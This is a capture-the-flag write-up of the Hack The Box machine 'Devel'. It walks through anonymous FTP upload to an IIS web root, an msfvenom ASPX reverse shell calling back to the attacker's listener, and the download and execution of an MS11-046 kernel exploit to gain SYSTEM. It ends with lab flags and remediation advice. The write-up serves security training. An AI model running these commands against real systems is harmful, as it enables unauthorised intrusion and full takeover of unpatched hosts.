# ☢️ Devel: Anonymous FTP to Kernel Exploitation

Target: Devel (Hack The Box) OS: Windows Difficulty: Easy Attack Vectors: Anonymous FTP Upload -\> Web Shell (ASPX) -\> Kernel Exploit…

---

### ☢️ Devel: Anonymous FTP to Kernel Exploitation

![](https://cdn-images-1.medium.com/max/800/1*wwXexWOzC184-y37N9rYIQ.png)

**Target:** *Devel (Hack The Box)* **OS:** *Windows* **Difficulty:** *Easy* **Attack Vectors:** *Anonymous FTP Upload -\> Web Shell (ASPX) -\> Kernel Exploit (MS11–046).*

> <a href="https://medium.com/system-weakness/%EF%B8%8F-devel-anonymous-ftp-to-kernel-exploitation-388c1468dfd3?sk=c5cf967c15543ea5dd74a7e4c9d6c9f5" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/system-weakness/%EF%B8%8F-devel-anonymous-ftp-to-kernel-exploitation-388c1468dfd3?sk=c5cf967c15543ea5dd74a7e4c9d6c9f5" target="_blank">**Not a Member?? Click Here to read Full-Story**</a>

### Executive Summary

This assessment targeted “Devel,” a legacy Windows machine running Microsoft IIS 7.5. The initial foothold was achieved by identifying a critical misconfiguration in the FTP service: **Anonymous Login** was enabled, and the FTP root directory was identical to the Web Server root. By uploading a malicious ASPX web shell via FTP and executing it through the web browser, I obtained a shell as the `iis apppool\web` user. Root (System) privilege escalation was achieved by identifying that the operating system (Windows 7/2008 R2) was unpatched. I utilized a known kernel exploit (MS11-046) to elevate privileges from a service account to `NT AUTHORITY\SYSTEM`.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

**1.1.1 Nmap Scan**

- <span id="2ce5">We began the assessment with a comprehensive Nmap scan to identify open ports and services on `10.10.10.5`.</span>

```
nmap -sC -sV -A -vvv 10.10.10.5
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**1.1.2 Nmap Scan Analysis** The scan revealed a very specific attack surface:

- <span id="96a4">**Port 21 (FTP):** Microsoft FTP service. Crucially, the script `ftp-anon` reports that **Anonymous FTP login is allowed**.</span>
- <span id="4ecf">**Port 80 (HTTP):** Microsoft IIS 7.5. This version typically runs on **Windows 7** or **Windows Server 2008 R2**.</span>

**The Critical Link:** The file listing in the FTP service (`iisstart.htm`, `welcome.png`, `aspnet_client`) matches the default files found in a standard IIS web root (`C:\inetpub\wwwroot`). This strongly suggests that **the FTP server and the Web server are serving the exact same directory**.

**1.1.3 Key Findings**

- <span id="86d2">**Vulnerability:** Anonymous FTP allows access to the Web Root.</span>
- <span id="3bd9">**Potential Exploit:** If we have **write** permissions on the FTP server, we can upload a malicious script (like a `.aspx` web shell) and then execute it by visiting the URL in a browser.</span>
- <span id="6621">**Target OS:** Likely Windows 7 or Server 2008 R2 (End of Life), implying potential kernel vulnerabilities.</span>

#### 1.2 FTP Access & Write Verification

#### 1.2.1

- <span id="1aea">To confirm that the FTP service was indeed tied to the Web Root, I attempted to upload a text file and access it via HTTP.</span>

#### 1.2.2 Execution

1.  <span id="8915">**Created a test file:** `echo "This is a test by R00t3dbyFa17h" > test.txt`</span>
2.  <span id="d8b1">**Connected to FTP:** Logged in as `anonymous` / `anonymous`.</span>
3.  <span id="3659">**Uploaded the file:** `put test.txt`</span>
4.  <span id="2045">**Verification:** Accessed the file via `curl`.</span>

**Command:**

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Devel]
└─$ curl http://10.10.10.5/test.txt
This is a test by R00t3dbyFa17h
```

**Analysis:** The ability to write files to the web root via anonymous FTP, combined with the ability to execute them via the browser, constitutes a **Remote Code Execution (RCE)** vulnerability.

### 2.0 Exploitation

#### 2.1 Payload Generation

**2.1.1** To exploit the unrestricted file upload, I generated a malicious ASPX reverse shell using `msfvenom`.

**Command:**

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f aspx -o shell.aspx
```

#### 2.2 Upload & Execution

**2.2.1** I uploaded the payload via the anonymous FTP session and triggered it via the web server.

**Step 1: Upload**

```
ftp 10.10.10.5
> put shell.aspx
```

**Step 2: Execution** I started a Netcat listener (`nc -lvnp 4444`) and requested the file via `curl`.

**Command:**

```
curl http://10.10.10.5/shell.aspx
```

**Result:** A reverse connection was established.

```

┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Devel]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.5] 49160
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

### 3.0 Privilege Escalation: Kernel Exploitation

#### 3.1 Exploitation Strategy

**3.1.1** Given the target is an unpatched Windows 7 (Build 7600) machine, I opted to use **MS11–046 (Afd.sys)**. This exploit leverages a vulnerability in the Ancillary Function Driver (AFD) to elevate privileges to SYSTEM.

#### 3.2 Compilation & Delivery

**3.2.1** I downloaded the exploit code (Exploit-DB ID: 40564) to my attack machine and compiled it for the target architecture (Windows 32-bit/x86).

**Command (Linux):**

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Devel]
└─$ searchsploit -m 40564
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
    Codes: CVE-2011-1249, MS11-046
 Verified: True
File Type: C source, ASCII text
Copied to: /home/nicholas/HTB/Labs/Devel/40564.c

40564.c: In function ‘main’:
40564.c:488:5: error: too many arguments to function ‘ZwQuerySystemInformation’; expected 0, have 4
  488 |     ZwQuerySystemInformation(11, (PVOID) &systemInformation, 0, &systemInformation);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~ ~~
40564.c:502:5: error: too many arguments to function ‘ZwQuerySystemInformation’; expected 0, have 4
  502 |     ZwQuerySystemInformation(11, systemInformationBuffer, systemInformation * sizeof(*systemInformationBuffer), NULL);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~ ~~
```

#### 3.2 Payload Delivery

**3.2.1 Methodology** Due to compilation errors with the legacy source code on a modern architecture, I opted to use a pre-compiled binary for **MS11–046**. This ensures stability and avoids compatibility issues with modern C libraries.

**Command:**

```
wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe
```

3.2.2 FTP Upload (The Critical Fix)

- <span id="4bae">I uploaded the binary via the anonymous FTP session. **Note:** A critical step here was switching the FTP transfer mode to **Binary**. My initial attempt failed because the default ASCII mode corrupted the executable, rendering it unrunnable (`This program cannot be run in DOS mode`).</span>

**Command:**

```
ftp 10.10.10.5
> binary
> put MS11-046.exe
```

#### 3.3 Root Escalation

**3.3.1 Execution**

- <span id="caa9">With the binary correctly uploaded to `C:\inetpub\wwwroot`, I returned to my web shell and executed the exploit.</span>

**Command:**

```
C:\inetpub\wwwroot>MS11-046.exe
MS11-046.exe
```

**3.3.2 Result**

- <span id="6327">The exploit successfully triggered the `Afd.sys` vulnerability, instantly elevating my session from `iis apppool\web` to `NT AUTHORITY\SYSTEM`.</span>

**Proof of Pwn:**

```
c:\Windows\System32> whoami
nt authority\system
```

### 4.0 Loot (Flags)

With SYSTEM privileges, I bypassed the previous “Access Denied” restrictions and retrieved both flags.

**User Flag:**

> *`0fd9a2a99c8c95f2776f44cb17cc584a`*

**Root Flag:**

> *`6c7fb9661946cb2371ab40c4aa351e32`*

### 5.0 Conclusion

The “Devel” machine is a textbook example of how a low-severity misconfiguration (Anonymous FTP) can chain into a total system compromise.

1.  <span id="23cb">**The Open Door:** Anonymous FTP allowed writing to the web root.</span>
2.  <span id="16d6">**The Execution:** IIS executed the uploaded ASPX shell.</span>
3.  <span id="f577">**The Kill:** An unpatched kernel (Windows 7 RTM) allowed a 14-year-old exploit (MS11–046) to grant Root access instantly.</span>

This box reinforces the “Defense in Depth” principle. Even if the FTP was secured, the unpatched kernel was a ticking time bomb waiting for any local user to detonate it.

### Red Team Mandate

**Remediation Strategy**

1.  <span id="052a">**Disable Anonymous FTP:** The FTP service should require valid credentials and should *never* map directly to the web root (`C:\inetpub\wwwroot`).</span>
2.  <span id="2088">**Patch Management:** The system is running Windows 7 Build 7600 (no Service Packs). It is missing over a decade of security updates. Immediate patching or decommissioning is required.</span>
3.  <span id="9e0b">**Least Privilege:** Ensure service accounts (like IIS) are isolated and cannot access critical system drivers.</span>

### The Biblical Tie-In

When we first tried to read the user flag, we got **“Access Denied.”** We were operating as a low-level user (`iis apppool`), and we simply didn't have the nature required to understand or access the "crown jewels" of the system. We had to be transformed (elevated) to `SYSTEM` to see the truth.

> ***“The person without the Spirit does not accept the things that come from the Spirit of God but considers them foolishness, and cannot understand them because they are discerned only through the Spirit.” — 1 Corinthians 2:14 (NIV)***

**Application:** In our spiritual lives, we often hit “Access Denied” when trying to understand God’s will or peace using only our human logic (our “user privileges”). We cannot brute-force our way into spiritual understanding. We must be “elevated” by the Holy Spirit. Just as the Kernel exploit gave us full vision of the system, the Holy Spirit gives us the discernment to see things that were previously hidden from us.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

- <span id="9f0d">Is there a specific tool you wish existed?</span>
- <span id="168b">Is there a hacking concept you want me to learn and explain?</span>
- <span id="2834">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/y5P9NrzUBX" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/y5P9NrzUBX" title="https://discord.gg/y5P9NrzUBX"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/y5P9NrzUBX" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="24dfae94077d6390f2d0a2dd40dfe1fc"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 12, 2026](https://medium.com/p/388c1468dfd3).

<a href="https://medium.com/@nicholasmullenski/%EF%B8%8F-devel-anonymous-ftp-to-kernel-exploitation-388c1468dfd3" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
